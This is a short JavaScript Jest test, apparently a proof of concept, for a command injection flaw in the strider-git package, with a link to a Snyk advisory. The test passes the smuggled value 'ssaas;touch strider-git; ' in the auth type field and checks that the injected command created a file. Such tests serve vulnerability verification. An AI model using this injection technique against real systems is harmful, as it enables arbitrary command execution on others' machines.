//https://snyk.io/vuln/SNYK-JS-STRIDERGIT-572913
test("Command Injection in strider-git", () => {
  const git = require("strider-git/lib");
  const fs = require("fs");
  const path = "./strider-git";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  git.getBranches(
    {
      auth: {
        type: "ssaas;touch strider-git; ",
        privkey: "sss",
      },
      url: "http://sss",
    },
    "",
    function () {}
  );
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
